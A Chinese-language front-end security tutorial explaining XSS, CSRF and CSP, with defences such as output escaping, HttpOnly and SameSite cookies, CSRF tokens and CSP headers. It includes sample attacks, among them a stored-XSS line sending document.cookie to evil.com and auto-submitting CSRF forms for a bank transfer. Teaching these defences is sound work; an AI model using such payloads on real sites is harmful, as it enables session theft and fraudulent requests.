# 前端安全策略梳理

> 本文详细介绍 XSS、CSRF、CSP 三大前端安全威胁的原理、攻击场景及防御手段。

## 一、XSS（跨站脚本攻击）

### 1.1 什么是 XSS

XSS（Cross-Site Scripting）攻击者将恶意脚本注入到正常网页，当用户访问时，脚本在受害者浏览器执行，从而盗取 Cookie、Session、跳转钓鱼页面等。

**XSS 三大类型：**

| 类型 | 原理 | 特点 |
|------|------|------|
| 反射型 | URL 参数直接拼接进页面，服务器反射回浏览器 | 非持久，需诱导点击 |
| 存储型 | 恶意脚本存入数据库，访问时返回给所有用户 | 持久，危害最大 |
| DOM 型 | 纯前端 JS 解析 URL 参数时触发，不经过服务器 | 隐蔽，难以被 WAF 识别 |

### 1.2 攻击示例

**反射型 XSS：**
```html
<!-- 服务器直接将 URL 参数输出到页面 -->
<div>搜索结果：<?php echo $_GET['q']; ?></div>

<!-- 攻击 URL -->
<!-- https://example.com/search?q=<script>alert(document.cookie)</script> -->
```

**存储型 XSS：**
```html
<!-- 评论内容存入数据库，未做过滤 -->
<!-- 任何访问该页面的用户都会执行脚本 -->
<textarea><script>fetch('http://evil.com?c='+document.cookie)</script></textarea>
```

**DOM 型 XSS：**
```js
// 前端直接解析 URL 参数
const params = new URLSearchParams(location.search);
document.write('搜索：' + params.get('q'));
// 访问 ?q=<img src=x onerror=alert(1)> 触发
```

### 1.3 防御手段

**① 输入过滤与输出编码**
```js
// 输出时进行 HTML 转义
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
```

**② CSP（Content Security Policy）**
```http
Content-Security-Policy: script-src 'self'; style-src 'self' 'unsafe-inline'
```

**③ HttpOnly Cookie**
```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```
`HttpOnly` 标记使 JS 无法读取 Cookie，有效防止 XSS 盗取 Session。

---

## 二、CSRF（跨站请求伪造）

### 2.1 什么是 CSRF

CSRF（Cross-Site Request Forgery）攻击者诱导用户访问恶意页面，该页面携带用户已在目标站点的认证信息，自动发起对目标站点的请求。

**关键特征：**
- 利用用户已登录的 Cookie
- 请求参数可预测（GET 或 POST）
- 服务器无法区分是否是用户自愿发起

### 2.2 攻击示例

```html
<!-- 恶意页面 -->
<img src="https://bank.com/transfer?to=hacker&amount=10000" width="0" height="0">

<!-- 或自动提交表单 -->
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="hacker">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

### 2.3 防御手段

**① CSRF Token（双重提交）**
```http
<!-- 服务器生成随机 Token -->
<!-- 表单中携带 Token -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="random_12345">
  <!-- 攻击者无法预测 Token 值 -->
</form>

<!-- 服务器验证 Token -->
if (req.body.csrf_token !== session.csrf_token) {
  return res.status(403).send('CSRF detected');
}
```

**② SameSite Cookie**
```http
Set-Cookie: session=abc123; SameSite=Strict
```
`SameSite=Strict`：Cookie 仅在同站请求时发送，完全阻止 CSRF。
`SameSite=Lax`：GET 请求可发送，但 POST 请求不发送。

**③ 验证码 / 二次确认**
敏感操作要求用户重新输入密码或验证码。

---

## 三、CSP（内容安全策略）

### 3.1 什么是 CSP

CSP（Content Security Policy）通过 HTTP 响应头告诉浏览器只允许加载指定来源的资源，有效防止 XSS 和数据注入攻击。

### 3.2 CSP 指令

| 指令 | 说明 | 示例 |
|------|------|------|
| `default-src` | 默认资源策略 | `'self'` 仅同源 |
| `script-src` | JS 来源 | `'self' 'nonce-abc123'` |
| `style-src` | CSS 来源 | `'self' 'unsafe-inline'` |
| `img-src` | 图片来源 | `'self' https://images.example.com` |
| `connect-src` | AJAX/Fetch/WebSocket | `'self' https://api.example.com` |
| `frame-src` | iframe 嵌入 | `'none'` |
| `report-uri` | 违规报告地址 | `/csp-report` |

**特殊值：**
- `'self'`：同源
- `'none'`：禁止任何来源
- `'unsafe-inline'`：允许内联脚本（降低安全性）
- `'unsafe-eval'`：允许 eval()（降低安全性）

### 3.3 配置示例

**严格策略（生产环境推荐）：**
```http
Content-Security-Policy:
  default-src 'none';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

**报告模式（仅报告不拦截）：**
```http
Content-Security-Policy-Report-Only:
  default-src 'self';
  report-uri /csp-violation-report;
```

### 3.4 nonce 与 hash

**nonce 方式（动态脚本）：**
```http
Content-Security-Policy: script-src 'nonce-random123'
```
```html
<!-- 只有带正确 nonce 的脚本执行 -->
<script nonce="random123">alert('safe')</script>
```

**hash 方式（静态脚本）：**
```http
Content-Security-Policy: script-src 'sha256-abc123...'
```
```html
<!-- 内联脚本的 hash 匹配才执行 -->
<script>alert('hello')</script>
```

---

## 四、安全策略对比

| 威胁 | 攻击入口 | 防御手段 | 优先级 |
|------|----------|----------|--------|
| XSS | 用户输入/URL参数 | CSP + 输入过滤 + HttpOnly | P0 |
| CSRF | 用户已认证的请求 | SameSite + CSRF Token | P0 |
| CSP | 外部资源注入 | 严格 CSP 策略 | P1 |

---

## 五、实用建议

1. **默认启用 CSP**：从 `report-only` 模式开始，逐步收紧
2. **Cookie 始终加 HttpOnly + Secure + SameSite**：三重保护
3. **敏感操作 CSRF Token**：任何状态变更请求都必须携带
4. **输入过滤 + 输出编码**：纵深防御，缺一不可
5. **定期审查 CSP 违规报告**：发现潜在攻击和配置问题
